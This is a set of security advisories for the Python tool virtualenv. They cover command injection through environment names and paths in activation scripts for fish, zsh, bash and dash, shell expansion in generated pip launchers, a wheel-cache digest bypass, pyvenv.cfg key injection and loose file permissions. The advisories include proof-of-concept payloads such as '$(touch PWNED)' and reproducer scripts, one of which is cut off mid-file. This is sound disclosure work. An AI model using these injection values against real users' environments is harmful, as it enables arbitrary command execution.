### Impact  `FishActivator` defines no `quote()`, so it inherits `ViaTemplateActivator.quote`, which returns `shlex.quote(string)`. That function follows POSIX `sh` rules, where a backslash inside single quotes stays a literal character. fish reads `\'` inside single quotes as an escaped quote and `\\` as an escaped backslash. A value with a backslash before a quote therefore ends the literal somewhere other than where `shlex.quote` put the end, and fish expands the command substitution that follows.  The environment path reaches `set -gx VIRTUAL_ENV`, and `--prompt` or `VIRTUALENV_PROMPT` reaches `set -gx VIRTUAL_ENV_PROMPT`. For `--prompt "x\'\$(touch PWNED)'\'"`, the generated `activate.fish` contains:  ```fish set -gx VIRTUAL_ENV_PROMPT 'x\'"'"'$(touch PWNED)'"'"'\'"'"'' ```  `source bin/activate.fish` runs `touch PWNED`, and fish prints no error. The same payload as a directory name runs through `VIRTUAL_ENV`. `--prompt .` takes the current directory's name, so running virtualenv inside a directory someone else named is enough. Without the backslash the payload runs nothing, and under bash it runs nothing either.  virtualenv generates `activate.fish` by default. An attacker needs to influence the environment path or prompt: a CI job or wrapper tool that passes a branch, project or job name through, or a directory in a cloned repository or unpacked archive.  The bug affects every release up to 21.14.1 that ships `activate.fish`. The GHSA-p58f-9548-mpm2 fix in 21.7.13 moved the placeholders outside their quotes but kept `shlex.quote`.  ### Patches  Fixed in 21.14.2. `activate.fish` now escapes backslashes and single quotes the way fish reads them, so the example above runs nothing and shows the prompt as given. Fix: https://github.com/pypa/virtualenv/commit/3bddeaf8d02c3ee7f576503efb082f8f494cfcab  ### Workarounds  Do not create an environment whose path or prompt contains a backslash, and inspect `activate.fish` before you source one you did not create.  ### Credits  Kevin Stubbings (@Kwstubbs) of GitHub Security Lab reported this issue.

### Impact  zsh users activate an environment with the bash `activate` script, which puts the environment name into `PS1`. Since 21.13.0 the script escapes backslashes, dollar signs and backticks in that name, but only when `BASH_VERSION` is set, so zsh gets the raw value. With the `PROMPT_SUBST` option set, zsh runs parameter expansion, command substitution and arithmetic expansion on `PS1` each time it draws the prompt. A name that contains `$(...)`, backticks or `${...}` then runs as commands in the user's shell, once per prompt.  The name comes from the environment directory, or from `--prompt` or `VIRTUALENV_PROMPT`. After you create an environment with:  ```console $ virtualenv 'x$(touch PWNED)y' ```  `source 'x$(touch PWNED)y/bin/activate'` in a zsh session with `PROMPT_SUBST` set creates `PWNED`, and the prompt shows `(xy)`. Passing that value as `--prompt` to an environment with a plain name has the same effect. Without `PROMPT_SUBST`, zsh shows the name as text and runs nothing. bash runs nothing either.  A plain zsh starts with `PROMPT_SUBST` off. oh-my-zsh users have it on: oh-my-zsh loads [`lib/theme-and-appearance.zsh`](https://github.com/ohmyzsh/ohmyzsh/blob/4d4cfc287e9d887b81242c0e431b5f49f9cec5c1/lib/theme-and-appearance.zsh#L5) at startup, and that file sets it. An attacker needs to influence the environment path or prompt: a CI job or wrapper tool that passes a branch, project or job name through, or a directory in a cloned repository or unpacked archive. `--prompt .` takes the current directory's name.  zsh also reads `%` in `PS1` as a prompt escape, so a name with `%n` showed the user name in place of those characters, though without running commands.  The bug is in releases up to and including 21.14.3. The payload runs on 20.26.6 and 21.14.3, and the reporter confirmed 21.9.1.  ### Patches  Fixed in 21.14.4. Under zsh, `activate` now escapes the name the way it does under bash and doubles `%`, so the example above runs nothing and the prompt shows the name as given. zsh gets the escaping even when `PROMPT_SUBST` is off, because a user can set the option after activation; a name with a backslash, dollar sign or backtick then shows the added backslashes. Fix: https://github.com/pypa/virtualenv/commit/5b915367da82bd024b2a0d28d2f98007034b4aa2  ### Workarounds  Set `VIRTUAL_ENV_DISABLE_PROMPT=1` before you source `activate`, which leaves `PS1` alone, or run `unsetopt prompt_subst` if your prompt does not need it. Check the name of an environment you did not create before you source its `activate`.  ### Credits  Kaya Emre Arikan (@kemrec) reported this issue.

### Impact  `ViaTemplateActivator.instantiate_template` replaces the placeholders in an activation template one key at a time, each across the whole text. When a value that it already substituted and quoted contains the name of a later placeholder, the later pass rewrites that name inside the quoted literal. The inserted value brings its own quotes, which close the outer literal, and the rest of the path runs as code when a user activates the environment.  `__VIRTUAL_NAME__` holds the environment's directory name, so a destination such as `A__VIRTUAL_NAME__B/x'$(touch PWNED)'y` is enough. In the default `activate` for bash, the `VIRTUAL_ENV` line renders as:  ```sh VIRTUAL_ENV='/tmp/t/A'x'"'"'$(touch PWNED)'"'"'y'B/x'"'"'$(touch PWNED)'"'"'y' ```  Sourcing that script runs `touch PWNED`. The same payload in a path without the placeholder name runs nothing. `activate.fish` runs the command the same way, and the reporter also showed Python code execution through `activate.xsh` and `bin/activate_this.py`. In `activate.csh`, a directory named after a prompt display placeholder, such as `__VIRTUAL_PROMPT_DISPLAY_TCSH__`, breaks the script with `Unmatched '''`.  No change to `quote()` can stop this, because the rewrite happens after `quote()` ran; it defeats `shlex.quote` and `repr()` alike.  An attacker needs to influence the destination path or `--prompt`: a CI job or wrapper tool that builds the path from a branch or project name, or a directory in a cloned repository or unpacked archive.  The bug affects versions 20.26.6 through 21.14.1. Version 20.26.6 first quoted template values (#2768) and introduced the per-key loop.  ### Patches  Fixed in 21.14.2. Activation scripts now keep a placeholder name in the environment's path or prompt as plain text, and activating the example above runs nothing. Fix: https://github.com/pypa/virtualenv/commit/602b26623a724827ff171bf11fef4ad186d01f74  ### Workarounds  Do not create an environment whose path or `--prompt` contains a placeholder name such as `__VIRTUAL_NAME__`, `__VIRTUAL_ENV__` or `__VIRTUAL_PROMPT__`, and inspect the generated activation script before you source one you did not create.  ### Credits  Kevin Stubbings (@Kwstubbs) of GitHub Security Lab reported this issue.

### Summary  The bash `activate` script escapes the environment name for only one of the two passes bash makes over `PS1`, so a backslash in the name undoes the escaping and a name containing `\$(...)` runs as commands in the user's shell each time bash draws the prompt.  ### Affected area  `src/virtualenv/activation/bash/activate.sh`, the block that prepends the environment name to `PS1`.  ### Attacker-controlled input  The environment name: the environment directory's name, or the `--prompt` or `VIRTUALENV_PROMPT` value. An attacker needs to influence it, for example through a CI job or wrapper tool that passes a branch, project or job name through, or a directory in a cloned repository or unpacked archive. `--prompt .` takes the current directory's name.  ### Details  bash handles `PS1` in two passes each time it draws the prompt: it first decodes backslash prompt escapes, turning `\\` into `\` and `\$` into `$` (or `#` for root), and then runs parameter expansion, command substitution and arithmetic expansion on the result. Since 21.13.0 the script escapes backslashes, dollar signs and backticks in the name, but only for the second pass, so the decode pass strips the escaping that a backslash in the name precedes. Releases before 21.13.0 do not escape the name at all. A bash running as root decodes `\$` to `#`, so the payload shows the wrong text there but runs nothing. zsh does no decode pass and is not affected.  ### Proof of concept  ```console $ virtualenv --prompt 'a\$(touch PWNED)' env $ bash --norc --noprofile -c 'source env/bin/activate; printf "%s" "${PS1@P}"' $ ls PWNED PWNED ```  ### Impact  Arbitrary command execution in the shell of a user who sources the `activate` script of an environment whose name an attacker influenced, with that user's privileges, once per prompt draw.  ### Versions tested  21.14.6 with bash 5.2.15 on Debian bookworm, as an unprivileged user and as root.  ### Known mitigation  Set `VIRTUAL_ENV_DISABLE_PROMPT=1` before you source `activate`, which leaves `PS1` alone, or run `shopt -u promptvars` if your prompt does not need expansion. Check the name of an environment you did not create before you source its `activate`.  ### Latest release  - [x] The problem reproduces on the latest virtualenv release.  21.14.6  ### Patches  Fixed in 21.14.7. Under bash, `activate` now escapes backslashes, dollar signs and backticks for both passes, so the example above runs nothing and the prompt shows the name as given. zsh keeps the single escaping it needs. Fix: https://github.com/pypa/virtualenv/commit/c3104e02474b652832a9bbaae79f6e1696296932  ### Credits  Found while running the virtualenv test suite as root inside the Anthropic OSS Scanner build image.

## Summary  A destination path supplied to virtualenv can be interpreted as shell syntax by a generated POSIX console launcher. The app-data seeder and pip delegate launcher generation to distlib but supply the interpreter path in a form that does not preserve it as literal data in the shell wrapper.  ## Affected area  POSIX console scripts generated by the app-data seeder or pip when the interpreter path requires a shell wrapper. Windows executable launchers are not affected by this path.  ## Attacker-controlled input  An attacker must influence the environment destination passed to virtualenv, and the user must subsequently run a generated launcher. The attacker does not need to modify an installed executable or control the user's app-data cache.  ## Affected code  The relevant 21.14.8 source is in [ScriptMakerCustom](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/via_app_data/pip_install/base.py).  ## Mechanism  The app-data seeder passes the environment's interpreter path through `enquote_executable()` to distlib's `ScriptMaker`. It adds double quotes for a path with a space but does not escape shell expansions inside those quotes. When the path has a space or the shebang exceeds 127 bytes, distlib emits a `#!/bin/sh` wrapper with a line shaped like `'''exec' "<path>" "$0" "$@"`. The shell expands `$(...)` and backticks in that path when the launcher is run. The same wrapper must also parse as Python, which exposes additional quote and backslash cases. Environment creation and activation do not trigger the shell payload.  ## Reproduction and evidence  The scanner created three environments: a control under `my -touch PWNED- project`, one under `my $(touch PWNED) project`, and one under a path of more than 127 bytes ending in `$(touch${IFS}PWNED)`. Each was created without producing `PWNED`. Running the generated `bin/pip --version` created `PWNED` in both attack cases; the control created none. The long-path case reached the shell wrapper without a space. This reproduces execution by the generated launcher, with the user's privileges, rather than during seeding.  The report dates the app-data seeder's distlib launcher integration to #1579, first released in 20.0.2. [PR #3417](https://github.com/pypa/virtualenv/pull/3417) quotes the raw interpreter path for the POSIX wrapper and repairs launchers written by the pip seeder. Pip's own distlib can write a vulnerable wrapper again during a later pip install or upgrade; the proposed virtualenv fix does not change pip's vendored code. The maintainer-provided follow-up review reports that later path separately.  ## Attack sequence  ```mermaid sequenceDiagram     participant A as Destination supplier     participant V as virtualenv seeder     participant D as distlib ScriptMaker     participant S as Generated bin/pip     participant U as User     A->>V: path contains $(touch PWNED)     V->>D: pass interpreter path with incomplete shell quoting     D->>S: write /bin/sh wrapper     Note over V,S: no payload runs during creation or activation     U->>S: pip --version     S->>S: shell expands path and runs touch     S-->>U: PWNED appears with user's privileges ```  ## Reproducer files  The following files are from the scanner report for `ANT-2026-5DZVLGL1`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update.  **`repro`**  ```text #!/usr/bin/env python3 import shutil import subprocess from pathlib import Path  WORK = Path("/tmp/repro-console-script")  # The attacker's whole input: the name of a directory above the environment (a repository, a project folder). DIRECTORY_NAMES = {     "CONTROL": "my -touch PWNED- project",     "OBSERVED": "my $(touch PWNED) project",     # no space: distlib also picks the /bin/sh launcher once "#!<dest>/bin/python" is longer than 127 bytes     "OBSERVED_LONG": "p" * 120 + "$(touch${IFS}PWNED)", }  shutil.rmtree(WORK, ignore_errors=True) pip_printed = {} created_by_pip = {} for label, name in DIRECTORY_NAMES.items():     # the payload can hold no "/", so it touches a relative PWNED: each case gets its own empty working directory     cwd = WORK / label / "cwd"     venv = WORK / label / name / "venv"     cwd.mkdir(parents=True)      # set up: the user creates an environment there with default options (--no-periodic-update keeps it offline)     subprocess.run(["virtualenv", "--quiet", "--no-periodic-update", str(venv)], cwd=cwd, check=True)     assert list(cwd.iterdir()) == [], "environment creation must not have created anything"      # trigger: the user runs the seeded pip; argv is a list, so the only shell that reads the name is bin/pip's own     pip = subprocess.run([venv / "bin" / "pip", "--version"], cwd=cwd, capture_output=True, text=True)     pip_printed[label] = pip.stdout     created_by_pip[label] = sorted(p.name for p in cwd.iterdir())      launcher = (venv / "bin" / "pip").read_text().splitlines()     print(f"{label}: directory name {name!r}")     print(f"  bin/pip line 1: {launcher[0]}")     print(f"  bin/pip line 2: {launcher[1]}")     print(f"  bin/pip --version printed: {(pip.stdout + pip.stderr).strip()}")     print(f"  files bin/pip created in the working directory: {created_by_pip[label]}")  # check: a directory name is data; starting pip must run pip and nothing else control_ok = pip_printed["CONTROL"].startswith("pip ") and created_by_pip["CONTROL"] == [] attack_ran = created_by_pip["OBSERVED"] == ["PWNED"] and created_by_pip["OBSERVED_LONG"] == ["PWNED"] print("BUG" if control_ok and attack_ran else "OK") ```  ## Fix scope and remaining exposure  PR #3417 changes launcher generation by the app-data seeder and repairs POSIX shell wrappers after pip seeding. The pip-seeder repair uses the same quoting rule and updates the installed RECORD hashes and sizes. It does not modify pip's vendored distlib.  A later independent pip installation or upgrade can replace a corrected launcher with an affected one. Existing launchers are not repaired by upgrading virtualenv alone. Recreate environments with the corrected virtualenv to regenerate them, and use trusted destination paths. Recreation does not protect launchers subsequently rewritten by pip. The follow-up review reports reproduction through the previous pip seeder and after a pip upgrade; those results are attributed to the reviewer.  ## Impact  Running an affected launcher can execute commands with the calling user's privileges. Classification: high, CVSS 7.8, `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`, following the project's [generated-script precedent](https://github.com/pypa/virtualenv/security/advisories/GHSA-p58f-9548-mpm2). The vector assumes attacker-controlled path data and a user invoking the resulting launcher. No prior victim privileges are required; successful command execution can affect the user's data and processes.  ## Versions tested  The maintainer confirmed validation of the reported findings on release 21.14.8. The subsequent review records reproduction on unfixed upstream/main; the affected launcher integration and dependency declarations are unchanged from 21.14.8. The first affected release has not been established. Fixed in 21.14.9.  ## Known mitigation  Use an environment destination chosen by a trusted user. For older releases, avoid generating environments at destinations derived from untrusted input.  ## Affected release  - [x] The problem reproduces on virtualenv 21.14.8.  ## Credits  Reported by Anthropic's OSS Scanner as ANT-2026-5DZVLGL1.

## Summary Wheel downloads go directly into the reusable wheelhouse, while the verification target is selected from pip's textual output. A verification failure does not remove the downloaded file from that cache. Anthropic's OSS Scanner reported this as `ANT-2026-ST00DRO3` in `virtualenv-20261015-005`, received on 15 October 2026. ## Affected area Download selection and promotion into the reusable wheel cache. ## Attacker-controlled input A download must fail verification, or the archive selected from pip output must differ from the file later reused. Default-index digest verification must be enabled. Existing custom-index exceptions are outside the promised PyPI comparison. ## Affected code The relevant 21.14.8 source is in [wheel download and digest check](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/wheels/acquire.py). ## Mechanism `download_wheel()` tells pip to write directly into the reusable `wheel/house` cache. It then selects a path to hash from the first `Saved ` line in pip's stdout, rather than from the file pip actually placed there. A package index can inject such a line through a discarded link's `data-requires-python` attribute. A separate failure exists without the forged line: a digest mismatch raises after the downloaded wheel has entered the cache, and the rejected bytes remain there. Later wheel selection does not hash the cached file again. ## Reproduction and evidence The scanner used a local index configured in `pip.conf`, with PyPI digest comparison still enabled. In the control case it served a modified pip wheel alone. `virtualenv --upgrade-embed-wheels` refused the mismatch, and a subsequent environment used the bundled pip. In the attack case the index added a link whose `data-requires-python` contained a forged `Saved ` line pointing at a genuine bundled wheel. The upgrade then exited without a digest error, recorded the modified wheel in its update log, and a later environment's `pip --version` ran a line added by the index. The reproduction used a known absolute path to the genuine bundled wheel; that prerequisite is part of this variant. The report also shows that a refused wheel can replace a previously accepted file of the same name in `wheel/house`, leaving rejected bytes available for later use. It does not claim to bypass TLS or affect the default PyPI setup. The gap follows the digest check added in #3251, first released in 21.7.12. [PR #3430](https://github.com/pypa/virtualenv/pull/3430) downloads to a private temporary directory, verifies the actual archive, and promotes it only after acceptance. ## Attack sequence ```mermaid sequenceDiagram participant I as Configured index participant P as pip download participant C as wheel/house cache participant V as virtualenv digest check participant N as New environment I->>P: modified wheel and forged Saved line P->>C: write modified wheel directly P-->>V: stdout names genuine bundled wheel V->>V: hash genuine wheel and accept V->>C: record modified wheel for reuse C->>N: seed modified pip without rehash Note over P,C: Even a rejected wheel can remain in the cache ``` ## Reproducer files The following files are from the scanner report for `ANT-2026-ST00DRO3`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update. **`repro`** ```text #!/usr/bin/env python3 import atexit import hashlib import json import os import shutil import subprocess import sys from pathlib import Path companions = Path("/tmp/repro.d") work = Path("/tmp/forged-saved-line") home = work / "home" app_data = home / ".cache" / "virtualenv" this_python = f"{sys.version_info.major}.{sys.version_info.minor}" # the target; each Python has its own update log update_log_of_pip = app_data / "wheel" / this_python / "embed" / "3" / "pip.json" virtualenv = [sys.executable, companions / "virtualenv_with_local_pypi_json.py", work / "pypi"] as_user = {"cwd": home, "env": {"HOME": str(home), "PATH": os.environ["PATH"]}, "capture_output": True, "text": True} added_code_prints = "code added by the index" # check: the same modified wheel, refused without the forged line, is seeded with it print("BUG" if attack_ran_added_code and not control_ran_added_code else "OK") ``` **`repro.d/index_forges_saved_line.py`** ```text """Attacker, as the operator of the index the user's pip.conf names: make pip print a "Saved " line of its choice. usage: index_forges_saved_line.py Adds one link to the page of pip; the file behind it is a renamed copy of the genuine pip 26.2.1. ## Summary  Caller-supplied prompt text can become executable syntax in the bash activation prompt. An attacker must influence the value passed to virtualenv, and a user must subsequently activate the environment and draw the prompt.  ## Affected area  Bash runs with compatibility level 4.2 and draws the environment prompt. Its replacement-string behavior differs from newer compatibility modes, leaving prompt text subject to a second interpretation. The report concerns POSIX activation. It does not establish exposure through unrelated activators.  ## Attacker-controlled input  The attacker controls prompt or destination data passed as a virtualenv argument. The user later sources the generated activation script.  ## Affected code  The relevant 21.14.8 source is in [bash prompt assembly](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/bash/activate.sh).  ## Mechanism  `bin/activate` copies the prompt into `PS1`. A shell expands `PS1` again when it draws a prompt, so the value must survive both the assignment and that later expansion. The bash and zsh branches escape for their usual prompt rules. Three other paths still interpret prompt data as commands: dash sourcing `activate` directly, a child dash inheriting an exported `PS1` from bash, and bash running at compatibility level 4.2 or lower. A value such as `x$(touch MARKER)y` then runs `touch` on prompt display. Creating the environment does not run the payload.  ## Reproduction and evidence  The scanner's child-shell reproducer creates an environment with `--prompt 'x$(touch MARKER)y'`, sources `bin/activate` in interactive bash, and starts interactive `sh` (dash). Its control leaves `PS1` unexported: neither shell creates `MARKER`. With `PS1` exported, bash displays the prompt without executing the value, but the child dash creates `MARKER`; the reproducer ends in `BUG`. The report gives separate console reproductions for direct dash activation and bash compatibility level 4.2. The child-shell path can arise after another environment's activation has exported `PS1`.  The scanner linked this finding to [#3326](https://github.com/pypa/virtualenv/pull/3326) and its follow-up #3390. Those changes cover the usual bash path but leave the three paths above. The proposed change in [#3418](https://github.com/pypa/virtualenv/pull/3418) keeps a variable reference in `PS1`, so prompt text is expanded as data when drawn. The private report's reproducer was run by the scanner; the later command-execution result was supplied by the maintainer review. This advisory does not claim that every POSIX shell or every bash mode is affected.  ## Introduced  The report traces direct dash sourcing to the first 20.x activator (20.0.0b1), and inherited `PS1` to #3390 (first released in 21.14.7). It demonstrates the compatibility-level case on bash 5.2. Those historical boundaries come from the report; the release confirmed by the maintainer is 21.14.8.  ## Attack sequence  ```mermaid sequenceDiagram     participant A as Prompt supplier     participant V as virtualenv     participant B as Interactive bash     participant D as Child dash     A->>V: --prompt x$(touch MARKER)y     V->>B: generated bin/activate     B->>B: assign escaped prompt to PS1     alt PS1 is not exported         B->>D: start sh with its own PS1         D-->>B: marker absent     else PS1 is exported         B->>D: start sh with inherited PS1         D->>D: expand $(touch MARKER) on prompt draw         D-->>B: marker created     end ```  ## Reproducer files  The following files are from the scanner report for `ANT-2026-1MOI2X3T`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update.  **`repro`**  ```text #!/usr/bin/env python3 import shutil import subprocess from pathlib import Path  work = Path("/tmp/repro-inherited-ps1") shutil.rmtree(work, ignore_errors=True) work.mkdir() marker = work / "MARKER" print("sh is", Path("/bin/sh").resolve())  # attacker: only the text a tool such as tox or hatch relays as --prompt hostile_prompt = f"x$(touch {marker})y"  # set up: the environment, made with the virtualenv command subprocess.run(     ["virtualenv", "--no-periodic-update", "--without-pip", "--activators", "bash",      "--prompt", hostile_prompt, str(work / "env")],     check=True, stdout=subprocess.DEVNULL, ) assert not marker.exists(), "creating the environment must not run the prompt"  # user: in an interactive bash, source bin/activate, then start sh. # -i makes both shells draw their prompt although stdin is not a terminal; sh draws one, reads EOF and returns session = Path("/tmp/repro.d/user_session.sh").read_text() interactive_bash = ["bash", "--norc", "--noprofile", "-i"]  # control: PS1 set in bash but not exported, so sh does not inherit it control = subprocess.run(interactive_bash, input="PS1='\\$ '\n" + session,                          stderr=subprocess.PIPE, text=True, check=True) print(control.stderr) ran_in_control = marker.exists() print("CONTROL  PS1 not exported: marker created:", ran_in_control)  # attack: the same session with the one difference that PS1 is exported attack = subprocess.run(interactive_bash, input="export PS1='\\$ '\n" + session,                         stderr=subprocess.PIPE, text=True, check=True) print(attack.stderr) ran_in_attack = marker.exists() print("OBSERVED PS1 exported:     marker created:", ran_in_attack)  # check: the prompt text must be drawn, never run, by every shell that draws it print("BUG" if ran_in_attack and not ran_in_control else "OK") ```  **`repro.d/user_session.sh`**  ```text . /tmp/repro-inherited-ps1/env/bin/activate sh -i </dev/null ```  ## Impact  An affected activation can execute commands with the user's privileges. Severity is high, following the generated-script precedent in [GHSA-p58f-9548-mpm2](https://github.com/pypa/virtualenv/security/advisories/GHSA-p58f-9548-mpm2). The attack requires control of argument data and subsequent user activation; it does not require replacing an executable or controlling app-data contents.  ## Versions tested  The supplied follow-up review marks command execution as independently confirmed by its author. The implementation review used source inspection and patched literal-value checks, without rerunning that exploit. The relevant activation source is identical between release 21.14.8 and upstream/main 233359cb. The maintainer previously confirmed validation of the reported findings on 21.14.8. The first affected version has not been established. Fixed in 21.14.9.  ## Known mitigation  Use trusted prompt and destination values. On older releases, disable the environment prompt with VIRTUAL_ENV_DISABLE_PROMPT=1. Recreate environments with virtualenv 21.14.9 or later.  ## Affected release  - [x] The problem reproduces on virtualenv 21.14.8.  ## Credits  The original report was supplied by Anthropic's OSS Scanner as ANT-2026-1MOI2X3T. The subsequent maintainer-provided review identified the remaining activation path.

## Summary  The venv creator reads the standard library's generated pyvenv.cfg with splitlines() and merges all resulting keys over virtualenv's configuration. Line-boundary characters from destination data can therefore become configuration structure before output sanitization.  Anthropic's OSS Scanner reported this as `ANT-2026-6ZQHJ6VI` in `virtualenv-20261015-005`, received on 15 October 2026.  ## Affected area  Configuration readback by the stdlib venv creator.  ## Attacker-controlled input  An untrusted caller must influence the destination pathname passed to the venv creator. That pathname must contain a character that Python treats as a line boundary. The builtin creator follows a different configuration-writing path.  ## Affected code  The relevant 21.14.8 source is in [venv readback](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/via_global_ref/venv.py), [configuration parser](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/pyenv_cfg.py).  ## Mechanism  With `--creator venv`, virtualenv asks the standard library to create an environment, reads its `pyvenv.cfg` with `str.splitlines()`, and merges the parsed keys over virtualenv's chosen settings. CPython writes the destination into a `command =` value without escaping every character that `splitlines()` recognizes as a line boundary. A destination containing U+2028, for example, can therefore supply new `home` and `include-system-site-packages` keys during readback. Virtualenv writes those keys as real configuration lines. The builtin creator does not use this readback path.  ## Reproduction and evidence  The scanner used one destination value with U+2028 between `home = /attacker/chosen`, `include-system-site-packages = true`, and an absorbing `x =` key. A `python -m venv --without-pip` control kept the value inside its `command` line and reported the base interpreter's `sys._home`. `virtualenv --creator venv --no-seed` on the same value wrote separate injected configuration lines and its interpreter reported `sys._home = /attacker/chosen`. The path did not require a literal newline byte. The control establishes that the extra keys came from virtualenv's readback, not from the standard library's initial file alone.  The altered `home` can change which standard-library files the interpreter loads if an attacker also controls that location; `include-system-site-packages = true` weakens environment isolation. Choosing the venv creator is required, either explicitly or through a rare fallback. The report traces the readback to the 20.x rewrite, first released in 20.0.0b1. [PR #3426](https://github.com/pypa/virtualenv/pull/3426) rejects line-boundary characters before creation and rebuilds the final configuration from selected settings.  ## Attack sequence  ```mermaid sequenceDiagram     participant A as Destination supplier     participant S as stdlib venv     participant V as virtualenv readback     participant C as Final pyvenv.cfg     participant P as Environment Python     A->>S: path contains U+2028 and home = /attacker/chosen     S->>C: write path inside command value     V->>C: read with splitlines()     V->>V: parse suffix as separate keys     V->>C: rewrite home and include-system-site-packages     P->>C: read injected keys on startup     C-->>P: sys._home changes and isolation is disabled ```  ## Reproducer files  The following files are from the scanner report for `ANT-2026-6ZQHJ6VI`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update.  **`repro`**  ```text #!/usr/bin/env python3 import os import shutil import subprocess  work = "/tmp/repro-venv-creator-cfg" shutil.rmtree(work, ignore_errors=True)  # the attacker's input: the text of a destination path. # U+2028 ends a line for str.splitlines() but not for CPython's own pyvenv.cfg reader. # The slashes only make nested directories; the last key, x, absorbs the rest of the path. LS = "\u2028" dest = f"{work}/proj{LS}home = /attacker/chosen{LS}include-system-site-packages = true{LS}x = /env"  base_python = os.path.realpath(shutil.which("python")) real_home = os.path.dirname(base_python)   def pyvenv_cfg_lines(env):     # split on "\n" only, as the interpreter does     return open(f"{env}/pyvenv.cfg", encoding="utf-8").read().split("\n")   def sys_home(env):     # site.py sets sys._home from the `home` key of the environment's pyvenv.cfg     probe = [f"{env}/bin/python", "-c", "import sys; print(sys._home)"]     return subprocess.run(probe, capture_output=True, text=True, check=True).stdout.strip()   # control: the same path through the standard library alone stdlib_env = dest + "-stdlib" subprocess.run([base_python, "-m", "venv", "--without-pip", stdlib_env], check=True)  # attack: the same path through virtualenv; --creator venv is the one non-default option virtualenv_env = dest + "-virtualenv" created = subprocess.run(["virtualenv", "--quiet", "--no-periodic-update", "--no-seed", "--creator", "venv", virtualenv_env]) if created.returncode != 0:  # refusing such a destination is a valid fix     print("virtualenv refused the destination")     print("OK")     raise SystemExit  # check stdlib_cfg, stdlib_home = pyvenv_cfg_lines(stdlib_env), sys_home(stdlib_env) virtualenv_cfg, virtualenv_home = pyvenv_cfg_lines(virtualenv_env), sys_home(virtualenv_env)  print("CONTROL  python -m venv wrote pyvenv.cfg:") for line in stdlib_cfg:     print("    " + ascii(line)) print(f"CONTROL  python -m venv: sys._home = {stdlib_home}") print("OBSERVED virtualenv --creator venv wrote pyvenv.cfg:") for line in virtualenv_cfg:     print("    " + ascii(line)) print(f"OBSERVED virtualenv --creator venv: sys._home = {virtualenv_home}")  keys_injected = "home = /attacker/chosen" in virtualenv_cfg and "include-system-site-packages = true" in virtualenv_cfg print("BUG" if stdlib_home == real_home and keys_injected and virtualenv_home == "/attacker/chosen" else "OK") ```  ## Impact  Destination path data can change configuration boundaries and therefore environment settings. The effect depends on which settings change and how the environment is subsequently used.  Severity: low.  ## Versions tested  The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected version or exclude earlier releases. Fixed in 21.14.9.  The fix rejects line boundaries in the supplied destination before filesystem access and checks the resolved path again before invoking stdlib venv. The final configuration is rebuilt from the selected interpreter and virtualenv options, without merging the intermediate stdlib file or its vendor-specific keys. Ordinary destination paths remain supported.  Fix: [PR #3426](https://github.com/pypa/virtualenv/pull/3426).  ## Known mitigation  Reject line-boundary characters in externally supplied destination paths, or use the builtin creator where supported.  ## Affected release  - [x] The problem reproduces on virtualenv 21.14.8.  ## Credits  Reported by Anthropic's OSS Scanner as ANT-2026-6ZQHJ6VI.

## Summary  The app-data copy seeder uses shutil.copy, which preserves cached file modes independently of the current umask. A cache populated under permissive permissions can therefore produce files with wider access in later environments.  Anthropic's OSS Scanner reported this as `ANT-2026-487MH6OW` in `virtualenv-20261015-005`, received on 15 October 2026.  ## Affected area  Permissions of files copied from app-data into a new environment.  ## Attacker-controlled input  The cache must contain files created with broader permissions than the current environment creator intends. Another account must also be able to traverse the new environment and reach those files. A private parent directory prevents that access. No control of a private live cache is assumed.  ## Affected code  The relevant 21.14.8 source is in [copy helpers](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).  ## Mechanism  The default app-data seeder extracts a wheel into a reusable cache and copies its files into later environments with `shutil.copy()`. That function applies the cached source mode to each destination file after creating it, overriding the current run's umask. If the cache image was built under umask `000`, a later environment created under umask `022` can receive mode-`0666` pip files. The cache may be private while the new environment is reachable by other local accounts.  ## Reproduction and evidence  The scanner created two histories with separate private app-data caches. In the control, the owner's first run used umask `022`; a later environment had no files writable by another account, and that account could not append to `pip/__init__.py`. In the attack history, the first run used umask `000` and the later run still used `022`. The report counted 478 of 493 environment files writable by others. A second unprivileged uid appended a line to pip, and `bin/pip --version` ran it as the environment owner. The cache itself remained under a mode-`0700` home in both histories.  An attacker cannot force the owner's earlier umask through this finding; the attack also needs a traversable destination. A mode-`002` cache can expose group write access under suitable group permissions. The scanner dates app-data copy seeding to #1578, first released in 20.0.2. [PR #3425](https://github.com/pypa/virtualenv/pull/3425) creates copied files under a fixed non-writable-by-others policy further restricted by the current umask.  ## Attack sequence  ```mermaid sequenceDiagram     participant U as Environment owner     participant C as Private app-data cache     participant E as Later environment     participant A as Other local account     U->>C: first seed extraction under umask 000     C-->>U: cached pip files have mode 0666     U->>E: create environment under umask 022     C->>E: shutil.copy reapplies mode 0666     A->>E: append code to pip/__init__.py     U->>E: run bin/pip --version     E-->>U: appended code runs as owner ```  ## Reproducer files  The following files are from the scanner report for `ANT-2026-487MH6OW`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update.  **`repro`**  